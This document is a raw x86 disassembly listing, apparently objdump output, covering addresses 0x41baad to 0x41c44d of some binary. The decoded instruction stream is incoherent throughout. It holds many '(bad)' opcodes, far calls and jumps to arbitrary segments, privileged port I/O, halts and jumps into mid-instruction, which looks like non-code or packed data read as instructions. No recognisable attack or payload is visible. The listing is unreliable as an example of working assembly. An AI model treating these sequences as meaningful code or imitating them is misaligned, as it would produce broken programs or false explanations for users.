  41baad:	fstp   QWORD PTR [edx+0x462fcbda]
  41bab3:	pushf  
  41bab4:	xchg   dl,ah
  41bab6:	call   0xd38d:0x3611862b
  41babd:	clc    
  41babe:	imul   eax,DWORD PTR [ebx-0x2b],0xffffffb7
  41bac2:	and    al,0xea
  41bac4:	adc    DWORD PTR [edi],0xfffffff5
  41bac7:	xchg   esi,eax
  41bac8:	fs retf 0x6fa7
  41bacc:	push   edi
  41bacd:	fs add al,0xc4
  41bad0:	sub    DWORD PTR [edi-0x4a4752d0],edi
  41bad6:	cmp    bh,dl
  41bad8:	mov    esp,0x48a3d21e
  41badd:	lock xchg ebx,eax
  41badf:	jnp    0x41baed
  41bae1:	push   DWORD PTR [edx]
  41bae3:	fwait
  41bae4:	push   esp
  41bae5:	inc    edx
  41bae6:	jae    0x41ba68
  41bae8:	cmp    ch,BYTE PTR [esp+edi*1+0x48]
  41baec:	(bad)  
  41baed:	push   0x846c2ab6
  41baf2:	xor    DWORD PTR [eax-0x29239cd6],ebp
  41baf8:	(bad)  [edx-0x6a6a08b6]
  41bafe:	inc    edi
  41baff:	std    
  41bb00:	aas    
  41bb01:	cmp    al,0x30
  41bb03:	add    BYTE PTR [edx+0x92a6b6e],0x5b
  41bb0a:	(bad)  
  41bb0c:	mov    dl,0xa7
  41bb0e:	mov    bl,0x33
  41bb10:	sbb    DWORD PTR [ecx],edi
  41bb12:	pop    esp
  41bb13:	or     al,0x51
  41bb15:	outs   dx,DWORD PTR ds:[esi]
  41bb16:	mov    eax,0xa54b3801
  41bb1b:	clc    
  41bb1c:	xchg   edx,eax
  41bb1d:	cs (bad) 
  41bb1f:	aam    0x43
  41bb21:	popa   
  41bb22:	adc    BYTE PTR [eax-0x4],0xec
  41bb26:	cmc    
  41bb27:	cmp    bh,ch
  41bb29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb2a:	inc    esp
  41bb2b:	adc    ecx,eax
  41bb2d:	and    BYTE PTR [ecx],ah
  41bb2f:	sbb    al,0x75
  41bb31:	out    dx,eax
  41bb32:	enter  0x9fd2,0xbe
  41bb36:	mov    ebx,0x72959b8d
  41bb3b:	cmc    
  41bb3c:	out    dx,al
  41bb3d:	fs adc eax,0xd65e0d5
  41bb43:	test   eax,0x7f68e35
  41bb48:	mov    bh,0x23
  41bb4a:	fild   DWORD PTR [ebp-0x52]
  41bb4d:	mov    al,0x59
  41bb4f:	shl    DWORD PTR [ebp-0x5e],cl
  41bb52:	add    ebx,edi
  41bb54:	shl    DWORD PTR ds:0x7a66c2d0,0xf8
  41bb5b:	nop
  41bb5c:	mov    ecx,0x2e7a91d4
  41bb61:	jb     0x41bbb5
  41bb63:	jno    0x41bb9a
  41bb65:	dec    esi
  41bb66:	push   edi
  41bb67:	cli    
  41bb68:	fs cli 
  41bb6a:	sar    BYTE PTR [esi+0xfdc0],cl
	...
  41bbd4:	add    BYTE PTR [eax],al
  41bbd6:	or     bh,BYTE PTR [eax-0x4048555b]
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi+0x7e],cx
  41bbe3:	jge    0x41bbfc
  41bbe5:	das    
  41bbe6:	sub    al,BYTE PTR [bx+di]
  41bbe9:	add    BYTE PTR [eax],al
  41bbeb:	add    DWORD PTR [eax],eax
  41bbed:	add    dl,cl
  41bbef:	add    DWORD PTR [ebp-0x5a],edx
  41bbf2:	ss xchg al,bl
  41bbf5:	mov    esi,0x13198d5c
  41bbfa:	xor    eax,0xdabb5edc
  41bbff:	inc    eax
  41bc00:	and    al,bh
  41bc02:	mov    ebx,0x81c9e195
  41bc07:	push   eax
  41bc08:	adc    eax,0x960df88e
  41bc0d:	dec    ebx
  41bc0e:	inc    esi
  41bc0f:	in     eax,0x34
  41bc11:	int3   
  41bc12:	cmp    ebx,ebp
  41bc14:	das    
  41bc15:	test   eax,0x7346bc5a
  41bc1a:	mov    eax,ebp
  41bc1c:	cmc    
  41bc1d:	int    0x5f
  41bc1f:	and    BYTE PTR [esi],ch
  41bc21:	sbb    al,0x4c
  41bc23:	mov    al,0xeb
  41bc25:	add    al,BYTE PTR [esp+ebx*1+0x3e]
  41bc29:	mov    ch,0x8b
  41bc2b:	dec    eax
  41bc2c:	sub    BYTE PTR [edi],bh
  41bc2e:	nop
  41bc2f:	adc    edx,eax
  41bc31:	in     al,dx
  41bc32:	retf   
  41bc33:	outs   dx,DWORD PTR ds:[esi]
  41bc34:	xchg   ecx,eax
  41bc35:	in     eax,0x67
  41bc37:	push   ds
  41bc38:	loopne 0x41bc31
  41bc3a:	fsub   st(3),st
  41bc3c:	push   edx
  41bc3d:	push   es
  41bc3e:	add    eax,0xab50c088
  41bc43:	mov    ?,WORD PTR [edi]
  41bc45:	stc    
  41bc46:	add    ah,dl
  41bc48:	mov    esi,esi
  41bc4a:	adc    al,0x9c
  41bc4c:	sbb    DWORD PTR [edi+0x6c4d7f69],ebx
  41bc52:	sar    bl,1
  41bc54:	xchg   BYTE PTR [ebp+0x717516ba],cl
  41bc5a:	sub    eax,0x9f926b0b
  41bc5f:	retf   
  41bc60:	inc    eax
  41bc61:	mov    edi,0x9d87779
  41bc66:	test   esp,ecx
  41bc68:	aas    
  41bc69:	push   edi
  41bc6a:	fwait
  41bc6b:	imul   edx,DWORD PTR [ebx+0x51],0x55
  41bc6f:	pop    es
  41bc70:	push   edi
  41bc71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc72:	mov    esp,0xb9cc5f3a
  41bc77:	xchg   esp,eax
  41bc78:	sub    edi,edx
  41bc7a:	cld    
  41bc7b:	mov    ds:0x49ebc0ce,eax
  41bc80:	(bad)  
  41bc81:	sbb    al,0x4c
  41bc83:	icebp  
  41bc84:	in     eax,0x16
  41bc86:	clc    
  41bc87:	test   eax,0xce49a8ea
  41bc8c:	push   es
  41bc8d:	int    0x6b
  41bc8f:	ror    DWORD PTR [eax+0x67],0x60
  41bc93:	xor    al,0xd9
  41bc95:	mov    dh,BYTE PTR [esp+eiz*4-0x4867804d]
  41bc9c:	xchg   edi,eax
  41bc9d:	push   0xffffffb7
  41bc9f:	lahf   
  41bca0:	or     DWORD PTR [ebx],ebx
  41bca2:	fwait
  41bca3:	xchg   esi,eax
  41bca4:	icebp  
  41bca5:	scas   eax,DWORD PTR es:[edi]
  41bca6:	mov    al,ds:0xa05b16a8
  41bcab:	xchg   esi,eax
  41bcac:	je     0x41bc6c
  41bcae:	lahf   
  41bcaf:	mov    al,0x5a
  41bcb1:	or     edx,ebp
  41bcb3:	mov    ah,0x42
  41bcb5:	ds xchg ebp,eax
  41bcb7:	inc    eax
  41bcb8:	lods   al,BYTE PTR ds:[esi]
  41bcb9:	adc    dh,BYTE PTR [esi-0x5007c071]
  41bcbf:	cmp    BYTE PTR [edx],0x3a
  41bcc2:	lock cmp al,0x9b
  41bcc5:	scas   al,BYTE PTR es:[edi]
  41bcc6:	jmp    DWORD PTR [ebx]
  41bcc8:	out    dx,eax
  41bcc9:	jnp    0x41bc50
  41bccb:	push   DWORD PTR [ecx-0x479d1551]
  41bcd1:	adc    bh,BYTE PTR [edx]
  41bcd3:	cdq    
  41bcd4:	mov    al,0xac
  41bcd6:	mov    edx,0x457f43a5
  41bcdb:	push   edi
  41bcdc:	jb     0x41bc92
  41bcde:	test   DWORD PTR [ecx],ebp
  41bce0:	xor    eax,0xaa98e718
  41bce5:	jb     0x41bcd1
  41bce7:	retf   0xc696
  41bcea:	mov    edi,0x1a5491
	...
  41bd53:	add    BYTE PTR [eax],al
  41bd55:	add    dl,dl
  41bd57:	xor    bh,dl
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0x830cd9d8
  41bd64:	out    0xb4,al
  41bd66:	sub    eax,DWORD PTR [bx+di]
  41bd69:	add    BYTE PTR [eax],al
  41bd6b:	add    DWORD PTR [eax],eax
  41bd6d:	add    BYTE PTR [esi+0x78],dh
  41bd70:	mov    ch,0x19
  41bd72:	setb   BYTE PTR [ebx+ecx*8+0x610047dc]
  41bd7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd7b:	stos   BYTE PTR es:[edi],al
  41bd7c:	add    eax,0xe444722e
  41bd81:	loopne 0x41bd7a
  41bd83:	mov    al,ds:0x6741a1b4
  41bd88:	fwait
  41bd89:	popa   
  41bd8a:	lods   al,BYTE PTR ds:[esi]
  41bd8b:	std    
  41bd8c:	jo     0x41bde0
  41bd8e:	pop    ebp
  41bd8f:	shl    BYTE PTR [ebp-0x46124d96],cl
  41bd95:	inc    ebp
  41bd96:	add    BYTE PTR [ebp-0x62160e8f],dl
  41bd9c:	es lahf 
  41bd9e:	push   esp
  41bd9f:	(bad)  
  41bda0:	outs   dx,DWORD PTR ds:[esi]
  41bda1:	fild   QWORD PTR [ebp+0x75]
  41bda4:	fcom   QWORD PTR [edi+0x4a]
  41bda7:	sbb    al,0xa7
  41bda9:	into   
  41bdaa:	sbb    al,0x3c
  41bdac:	adc    DWORD PTR [ebp-0x3112251c],esp
  41bdb2:	stos   DWORD PTR es:[edi],eax
  41bdb3:	(bad)  
  41bdb4:	mov    esp,0x6a401080
  41bdb9:	inc    edx
  41bdba:	inc    ebx
  41bdbb:	stos   BYTE PTR es:[edi],al
  41bdbc:	or     ebp,ebx
  41bdbe:	xchg   BYTE PTR [edi+0x14],ah
  41bdc1:	inc    edx
  41bdc2:	out    0xe6,al
  41bdc4:	mov    ds:0x3dd3709f,eax
  41bdc9:	pop    esp
  41bdca:	and    al,0xe4
  41bdcc:	inc    eax
  41bdcd:	in     eax,dx
  41bdce:	or     dh,BYTE PTR [eax-0x113341ec]
  41bdd4:	pop    edx
  41bdd5:	out    dx,al
  41bdd6:	shl    ebp,cl
  41bdd8:	jmp    0x75e:0xd4b
  41bdde:	ja     0x41be4e
  41bde0:	push   edi
  41bde2:	add    edi,edx
  41bde4:	loopne 0x41be31
  41bde6:	add    BYTE PTR [eax-0x80],dl
  41bde9:	fisubr WORD PTR [ecx]
  41bdeb:	test   BYTE PTR [eax-0x7c],bh
  41bdee:	clc    
  41bdef:	addr16 dec edi
  41bdf1:	adc    BYTE PTR [ebx+edi*1+0x2a4872c3],bl
  41bdf8:	fisttp WORD PTR [eax+0x46050591]
  41bdfe:	leave  
  41bdff:	mov    esp,0x5a28b4a5
  41be04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be05:	ss pop es
  41be07:	cwde   
  41be08:	cmp    ch,BYTE PTR [edi]
  41be0a:	dec    ebp
  41be0b:	and    al,0x33
  41be0d:	mov    ds:0xa871cb15,al
  41be12:	jo     0x41be8b
  41be14:	enter  0x36f5,0xaf
  41be18:	mov    esp,cs
  41be1a:	call   DWORD PTR [ebp-0x1cad6554]
  41be20:	ret    0x719c
  41be23:	(bad)  
  41be24:	push   ebx
  41be25:	mov    al,ds:0xf9ee6a04
  41be2a:	lods   eax,DWORD PTR ds:[esi]
  41be2b:	std    
  41be2c:	sub    al,0xe1
  41be2e:	arpl   cx,bx
  41be30:	adc    eax,0x320bf070
  41be35:	dec    esi
  41be36:	js     0x41beb5
  41be38:	fbstp  TBYTE PTR [ecx+0x1397b5af]
  41be3e:	sti    
  41be3f:	aaa    
  41be40:	xchg   esi,eax
  41be41:	fistp  WORD PTR [ecx+eiz*2+0xac1e963]
  41be48:	call   0xe4ae:0x94d2e861
  41be4f:	data16 arpl WORD PTR [esi],sp
  41be52:	and    eax,DWORD PTR [eax+ecx*1]
  41be55:	push   ecx
  41be56:	push   eax
  41be57:	dec    ecx
  41be58:	pop    esi
  41be59:	fdivr  QWORD PTR [edx]
  41be5b:	cmp    esi,DWORD PTR [eax-0x61b53043]
  41be61:	mov    ebx,0x350fed4d
  41be66:	mov    edi,DWORD PTR [ebx+edi*1]
  41be69:	or     DWORD PTR [esi+0x4b],esi
  41be6c:	cmp    BYTE PTR [esi+0x0],ah
	...
  41bed6:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41bedc:	imul   edi
  41bede:	mov    ebp,DWORD PTR [ecx+0x70053f66]
  41bee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bee5:	mov    ds:0x12c67,al
  41beea:	add    BYTE PTR [ecx],al
  41beec:	add    BYTE PTR [eax],al
  41beee:	jnp    0x41bf50
  41bef0:	in     al,0x94
  41bef2:	jae    0x41bf51
  41bef4:	ins    DWORD PTR es:[edi],dx
  41bef5:	jbe    0x41be82
  41bef7:	cmp    BYTE PTR [eax-0x5d897cd3],al
  41befd:	add    edi,esp
  41beff:	add    BYTE PTR [edx+0x2b],al
  41bf02:	mov    DWORD PTR [edx],eax
  41bf04:	call   0x8335cf6a
  41bf09:	cmp    eax,0xf97d39d
  41bf0e:	dec    edx
  41bf0f:	repz cmp ah,cl
  41bf12:	sbb    al,0x39
  41bf14:	xchg   edx,eax
  41bf15:	inc    esi
  41bf16:	je     0x41beef
  41bf18:	popf   
  41bf19:	scas   al,BYTE PTR es:[edi]
  41bf1a:	div    DWORD PTR [ebp+0x5558c3ca]
  41bf20:	cld    
  41bf21:	mov    ?,WORD PTR [edx]
  41bf23:	sar    bh,1
  41bf25:	push   ss
  41bf26:	into   
  41bf27:	das    
  41bf28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf29:	sbb    edx,esi
  41bf2b:	dec    edi
  41bf2c:	inc    eax
  41bf2d:	jl     0x41bfa6
  41bf2f:	ins    DWORD PTR es:[edi],dx
  41bf30:	xor    edi,ebx
  41bf32:	pushf  
  41bf33:	dec    esi
  41bf34:	xchg   ebx,eax
  41bf35:	fisttp QWORD PTR [ebp+0x54]
  41bf38:	dec    ebp
  41bf39:	hlt    
  41bf3a:	loope  0x41bef9
  41bf3c:	or     al,dl
  41bf3e:	pop    ds
  41bf3f:	leave  
  41bf40:	rcl    cl,cl
  41bf42:	adc    DWORD PTR [ebx],edx
  41bf44:	iret   
  41bf45:	scas   eax,DWORD PTR es:[edi]
  41bf46:	mov    cl,0x96
  41bf48:	gs push cs
  41bf4a:	pop    edi
  41bf4b:	mov    fs,WORD PTR [ecx+eiz*1+0x61f399f1]
  41bf52:	dec    ecx
  41bf53:	stos   DWORD PTR es:[edi],eax
  41bf54:	iret   
  41bf55:	add    cl,BYTE PTR [edx-0x4b]
  41bf58:	xor    al,0x9b
  41bf5a:	add    BYTE PTR [esi+0x16c9f0a5],ch
  41bf60:	dec    BYTE PTR [esp-0x62]
  41bf64:	mov    edx,DWORD PTR [edx-0x6c]
  41bf67:	cli    
  41bf68:	ins    DWORD PTR es:[edi],dx
  41bf69:	test   eax,0x4d2e69ec
  41bf6e:	out    dx,al
  41bf6f:	stc    
  41bf70:	dec    ebx
  41bf71:	xor    dl,BYTE PTR [ebx-0xc8287bd]
  41bf77:	xor    dl,ah
  41bf79:	adc    eax,0x56ad066c
  41bf7e:	mov    ebp,0x1716a838
  41bf83:	mov    ah,0x57
  41bf85:	or     al,BYTE PTR [esi+0x331cb99a]
  41bf8b:	sbb    bh,BYTE PTR [esi]
  41bf8d:	jo     0x41bf65
  41bf8f:	hlt    
  41bf90:	dec    edi
  41bf91:	and    BYTE PTR [edx],dh
  41bf93:	mov    ds:0x56e08538,eax
  41bf98:	jg     0x41bfa5
  41bf9a:	xor    al,0x48
  41bf9c:	lock xchg esi,eax
  41bf9e:	retf   
  41bf9f:	call   DWORD PTR [ecx+0x25]
  41bfa2:	fistp  QWORD PTR [esi-0x2f]
  41bfa5:	aaa    
  41bfa6:	pop    eax
  41bfa7:	mov    al,ds:0x744e3883
  41bfac:	sbb    ebx,esp
  41bfae:	mov    edx,0x622006ac
  41bfb3:	and    dh,dl
  41bfb5:	mov    al,0x46
  41bfb7:	mov    ebx,0xcd0c998c
  41bfbc:	dec    esi
  41bfbd:	xor    dl,ah
  41bfbf:	jp     0x41bfd3
  41bfc1:	push   ebp
  41bfc2:	jecxz  0x41bf89
  41bfc4:	xor    al,0xb9
  41bfc6:	mov    bl,0x21
  41bfc8:	shl    DWORD PTR [ebx+eax*2-0x3c92906],1
  41bfcf:	sbb    BYTE PTR [edx-0x14],bl
  41bfd2:	jbe    0x41c031
  41bfd4:	out    0x7,al
  41bfd6:	and    eax,0x1de20418
  41bfdb:	rcr    DWORD PTR [ebp-0x1d8fae56],cl
  41bfe1:	ret    
  41bfe2:	enter  0x65c8,0x67
  41bfe6:	mov    al,ds:0xf9730718
  41bfeb:	jne    0x41bf87
  41bfed:	mov    eax,ds:0x0
	...
  41c056:	fs jae 0x41c08c
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	pop    ecx
  41c063:	xlat   BYTE PTR ds:[ebx]
  41c064:	xor    ecx,DWORD PTR [edi]
  41c066:	addr16 sub eax,0x1000001
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	jl     0x41c0a9
  41c070:	jnp    0x41c011
  41c072:	popa   
  41c073:	pop    ebx
  41c074:	xor    ch,BYTE PTR [eax-0x3]
  41c077:	shl    BYTE PTR [esi+0x14],cl
  41c07a:	(bad)  
  41c07b:	dec    edx
  41c07c:	sbb    al,0x96
  41c07e:	stos   DWORD PTR es:[edi],eax
  41c07f:	pop    ebp
  41c080:	test   DWORD PTR [eax],edi
  41c082:	(bad)  
  41c083:	mov    cl,0x82
  41c085:	xchg   ebx,eax
  41c086:	sub    BYTE PTR ds:0x7844e7bc,dl
  41c08c:	rol    DWORD PTR [ecx],cl
  41c08e:	jns    0x41c0ca
  41c090:	sahf   
  41c091:	inc    esi
  41c092:	ins    DWORD PTR es:[edi],dx
  41c093:	and    edx,DWORD PTR [ecx]
  41c095:	sub    DWORD PTR [edi+0x1a],esp
  41c098:	push   eax
  41c099:	cs xchg ecx,eax
  41c09b:	outs   dx,BYTE PTR ds:[esi]
  41c09c:	or     al,0x44
  41c09e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c09f:	ja     0x41c07d
  41c0a1:	push   cs
  41c0a2:	imul   BYTE PTR [esp+ebx*4+0x3a]
  41c0a6:	fidiv  DWORD PTR [edx+0x3c]
  41c0a9:	inc    ebx
  41c0aa:	jo     0x41c060
  41c0ac:	cmp    ax,0xe50
  41c0b0:	sub    BYTE PTR [esi],dh
  41c0b2:	stos   DWORD PTR es:[edi],eax
  41c0b3:	cmp    al,0xa5
  41c0b5:	loop   0x41c0f1
  41c0b7:	mov    bh,0x94
  41c0b9:	xchg   dl,bh
  41c0bb:	mov    dh,0x83
  41c0bd:	inc    eax
  41c0be:	or     eax,0x75286ac6
  41c0c3:	mov    edx,0x4778571b
  41c0c8:	aas    
  41c0c9:	popf   
  41c0ca:	inc    edi
  41c0cb:	pop    ebp
  41c0cc:	cs cs push cs
  41c0cf:	fistp  WORD PTR ds:0x83f35a48
  41c0d5:	in     eax,0xab
  41c0d7:	adc    DWORD PTR [edx-0x36],0xffffffb1
  41c0db:	scas   al,BYTE PTR es:[edi]
  41c0dc:	aaa    
  41c0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0de:	je     0x41c11c
  41c0e0:	mov    ds:0x56eb87c9,eax
  41c0e5:	fnstenv [ebx]
  41c0e7:	data16 mov al,0x8
  41c0ea:	les    ebp,FWORD PTR [eax+0x26]
  41c0ed:	jb     0x41c08f
  41c0ef:	mov    eax,ds:0x20fb6171
  41c0f4:	mov    cl,0x1
  41c0f6:	jl     0x41c128
  41c0f8:	jnp    0x41c0e2
  41c0fa:	mov    edi,0x6d593224
  41c0ff:	pop    sp
  41c101:	push   ds
  41c102:	shr    DWORD PTR [ecx+eax*2-0x693f5f64],0x63
  41c10a:	jge    0x41c10a
  41c10c:	dec    ebx
  41c10d:	iret   
  41c10e:	lods   eax,DWORD PTR ds:[esi]
  41c10f:	int3   
  41c110:	pop    ebx
  41c111:	mov    cl,0xc
  41c113:	jbe    0x41c15a
  41c115:	pop    ebx
  41c116:	sbb    BYTE PTR [ebx-0x7b7da67f],bh
  41c11c:	add    edx,DWORD PTR [ebp+0x6d48fb71]
  41c122:	dec    edx
  41c123:	jbe    0x41c0ac
  41c125:	ins    BYTE PTR es:[edi],dx
  41c126:	adc    eax,0x53556796
  41c12b:	and    al,0x90
  41c12d:	xchg   edx,eax
  41c12e:	or     BYTE PTR [esi+0x31295f17],0x46
  41c135:	pop    es
  41c136:	adc    BYTE PTR [esi],dl
  41c138:	xor    DWORD PTR [eax+0x498b31ac],edi
  41c13e:	inc    edx
  41c13f:	out    dx,eax
  41c140:	pop    ds
  41c141:	mov    dh,0x54
  41c143:	jmp    0x8843:0xce903ca4
  41c14a:	ficomp WORD PTR [edx]
  41c14c:	sub    BYTE PTR [ebp-0x39],al
  41c14f:	xchg   edi,eax
  41c150:	or     eax,0xc67076b0
  41c155:	or     dl,BYTE PTR [ecx-0xf7009e6]
  41c15b:	sub    BYTE PTR [esp+eax*4+0x22],bh
  41c15f:	mov    ebx,0xdb7061e1
  41c164:	add    DWORD PTR [edi],edi
  41c166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c167:	clc    
  41c168:	mov    esi,0x6a05762f
  41c16d:	rol    BYTE PTR [eax],cl
	...
  41c1d3:	add    BYTE PTR [eax],al
  41c1d5:	add    cl,bl
  41c1d7:	dec    edx
  41c1d8:	mov    eax,ds:0xd9fbb3f8
  41c1dd:	imul   edi,DWORD PTR ds:0x9fe90501,0xffffffa8
  41c1e4:	xor    edx,DWORD PTR [esi+0x12e67]
  41c1ea:	add    BYTE PTR [ecx],al
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	dec    edx
  41c1ef:	ss sub eax,0x92bb7aef
  41c1f5:	add    DWORD PTR [ebp-0x5476fcdd],ebx
  41c1fb:	in     al,0xc5
  41c1fd:	rcl    BYTE PTR [edx],0x69
  41c200:	sub    dh,BYTE PTR [esi+0x2e]
  41c203:	push   ds
  41c204:	adc    edx,edx
  41c206:	icebp  
  41c207:	stos   DWORD PTR es:[edi],eax
  41c208:	xchg   edi,eax
  41c209:	es call 0x37d7aaa
  41c20f:	mov    dl,0xd0
  41c211:	and    al,0x9e
  41c213:	outs   dx,DWORD PTR ds:[esi]
  41c214:	inc    eax
  41c215:	imul   edi,DWORD PTR [edx+0x7a],0x980d46f8
  41c21c:	dec    ebp
  41c21d:	stos   BYTE PTR es:[edi],al
  41c21e:	aas    
  41c21f:	jecxz  0x41c217
  41c221:	and    eax,0x20dfade5
  41c226:	mov    esp,0x918e207a
  41c22b:	xlat   BYTE PTR ds:[ebx]
  41c22c:	dec    ebx
  41c22d:	in     al,dx
  41c22e:	jmp    0xd39e0f3f
  41c233:	push   ecx
  41c234:	stc    
  41c235:	xchg   cl,dh
  41c237:	or     esi,DWORD PTR [esi-0xbab11b6]
  41c23d:	mov    ss,WORD PTR [edx]
  41c23f:	and    DWORD PTR [ebx-0x24065550],ecx
  41c245:	fimul  DWORD PTR [eax+eiz*4+0x2a]
  41c249:	xor    eax,0x62244a2c
  41c24e:	dec    eax
  41c24f:	int    0x7e
  41c251:	xor    ebx,edx
  41c253:	hlt    
  41c254:	lea    esp,[esi]
  41c256:	lods   al,BYTE PTR ds:[esi]
  41c257:	mov    BYTE PTR [ebx+0x3b],al
  41c25a:	ins    DWORD PTR es:[edi],dx
  41c25b:	add    esi,edi
  41c25d:	shr    DWORD PTR [esi-0x68ba4998],cl
  41c263:	(bad)  
  41c264:	js     0x41c24e
  41c266:	or     al,0x24
  41c268:	jae    0x41c259
  41c26a:	nop
  41c26b:	dec    esi
  41c26c:	cmp    BYTE PTR [esp+esi*4-0x65b5d462],bl
  41c273:	leave  
  41c274:	sahf   
  41c275:	pop    ebx
  41c276:	pop    edx
  41c277:	xchg   ecx,eax
  41c278:	iret   
  41c279:	das    
  41c27a:	dec    eax
  41c27b:	dec    ecx
  41c27c:	pop    es
  41c27d:	pop    es
  41c27e:	sub    BYTE PTR [edi],al
  41c280:	and    eax,0xd03c9b6
  41c285:	and    eax,0x40ac60a7
  41c28a:	mov    edx,0x91d714ca
  41c28f:	rcr    BYTE PTR [edi],0xe6
  41c292:	push   0x53
  41c294:	inc    edi
  41c295:	test   eax,esi
  41c297:	enter  0x5405,0xdb
  41c29b:	jbe    0x41c307
  41c29d:	mov    ebp,0x78ad4553
  41c2a2:	adc    ch,bh
  41c2a4:	aas    
  41c2a5:	mov    ds:0xb4a4c3e1,al
  41c2aa:	(bad)  
  41c2ab:	repnz sbb eax,0x68f5678c
  41c2b1:	mov    edi,0x3e9e8b6c
  41c2b6:	daa    
  41c2b7:	mov    cl,0x48
  41c2b9:	pop    es
  41c2ba:	sbb    al,0xf2
  41c2bc:	pop    esp
  41c2bd:	loopne 0x41c24a
  41c2bf:	mov    bh,0x7a
  41c2c1:	repz lahf 
  41c2c3:	call   0x9603:0xabeaf0ac
  41c2ca:	pop    edx
  41c2cb:	add    ecx,DWORD PTR [esi-0x17]
  41c2ce:	xlat   BYTE PTR ds:[ebx]
  41c2cf:	mov    ecx,0xf405d1af
  41c2d4:	sahf   
  41c2d5:	dec    edi
  41c2d6:	jmp    0x41c34f
  41c2d8:	or     ah,BYTE PTR [ecx+0x46748ab8]
  41c2de:	and    ch,BYTE PTR [eax]
  41c2e0:	pop    edx
  41c2e1:	cmp    BYTE PTR [esi-0x7327d3c5],dh
  41c2e7:	jns    0x41c359
  41c2e9:	add    al,BYTE PTR [edi+0x41a856]
	...
  41c353:	add    BYTE PTR [eax],al
  41c355:	add    bl,dh
  41c357:	and    ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	push   0xffffff94
  41c364:	adc    ch,dl
  41c366:	addr16 das 
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	add    BYTE PTR [ecx],al
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	ins    DWORD PTR es:[edi],dx
  41c36f:	inc    ebx
  41c370:	or     ch,BYTE PTR [eax+0x10]
  41c373:	dec    eax
  41c374:	outs   dx,BYTE PTR ds:[esi]
  41c375:	mov    ebx,0xcaad26a4
  41c37a:	jecxz  0x41c30e
  41c37c:	(bad)  
  41c37e:	inc    edx
  41c37f:	push   esp
  41c380:	js     0x41c36a
  41c382:	popf   
  41c383:	not    BYTE PTR [esi]
  41c385:	(bad)  
  41c386:	pop    ebx
  41c387:	test   eax,0x49182596
  41c38c:	(bad)  
  41c38d:	jp     0x41c38d
  41c38f:	mov    ds:0x6bfd0947,eax
  41c394:	sbb    BYTE PTR [ebx+0x66e5b112],bh
  41c39a:	add    BYTE PTR [edx+0x48],0xed
  41c39e:	das    
  41c39f:	xor    eax,0xdbbb1029
  41c3a4:	fidivr WORD PTR [ebx]
  41c3a6:	cmp    eax,0xa5e4e7e7
  41c3ab:	dec    esp
  41c3ac:	cwde   
  41c3ad:	test   BYTE PTR [ecx+0x39],0x16
  41c3b1:	sub    cl,bl
  41c3b3:	and    BYTE PTR [eax+esi*2+0x7d18b0e0],0x22
  41c3bb:	mov    esi,?
  41c3bd:	push   0xb
  41c3bf:	lahf   
  41c3c0:	fdiv   QWORD PTR [edi]
  41c3c2:	adc    al,0x9e
  41c3c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3c5:	mov    bh,0xd3
  41c3c7:	sub    ebp,DWORD PTR [eax-0x3f]
  41c3ca:	lods   eax,DWORD PTR ds:[esi]
  41c3cb:	rcl    cl,cl
  41c3cd:	push   ebx
  41c3ce:	cmp    ah,0xf0
  41c3d1:	fdivr  QWORD PTR [ebx]
  41c3d3:	dec    edx
  41c3d4:	imul   ebp,DWORD PTR [ebx-0x5a052de3],0x3c3f5372
  41c3de:	push   esi
  41c3df:	mov    edx,0x8b0a7c58
  41c3e4:	shl    BYTE PTR [eax+edx*4-0x3f],cl
  41c3e8:	adc    al,0x47
  41c3ea:	int    0x11
  41c3ec:	fwait
  41c3ed:	or     al,0x9b
  41c3ef:	cmp    BYTE PTR [esi+edi*8+0x6e],bh
  41c3f3:	push   0xffffff85
  41c3f5:	sbb    DWORD PTR [eax-0x4c3d7ed5],esp
  41c3fb:	cmp    ch,BYTE PTR gs:[edx]
  41c3fe:	mov    al,ds:0x9cb86301
  41c403:	aad    0xad
  41c405:	adc    edx,ebp
  41c407:	mov    ah,0xe8
  41c409:	push   ebx
  41c40a:	jmp    0x41c3ee
  41c40c:	stc    
  41c40d:	lahf   
  41c40e:	xlat   BYTE PTR ds:[ebx]
  41c40f:	or     al,0xc5
  41c411:	je     0x41c417
  41c413:	xchg   ebx,eax
  41c414:	xchg   esi,eax
  41c415:	repz push edx
  41c417:	sar    BYTE PTR [eax+0xa36ea80],0x9b
  41c41e:	xchg   ebp,eax
  41c41f:	call   FWORD PTR [ebx+0x22]
  41c422:	pop    esp
  41c423:	ja     0x41c497
  41c425:	out    0xc3,al
  41c427:	into   
  41c428:	xchg   ebp,eax
  41c429:	push   ebp
  41c42a:	xchg   edi,eax
  41c42b:	fwait
  41c42c:	inc    ebp
  41c42d:	sub    DWORD PTR [ebx+0x7c],ebx
  41c430:	inc    eax
  41c431:	fisub  WORD PTR [ecx]
  41c433:	mov    ebp,0x3ea0d062
  41c439:	or     al,BYTE PTR [esi-0x541411e6]
  41c43f:	or     dl,BYTE PTR [esi-0x1d359c37]
  41c445:	test   ecx,esp
  41c447:	fild   DWORD PTR [edi-0x31]
  41c44a:	retf   0x9673
  41c44d:	mov    ds,WORD PTR [ecx]
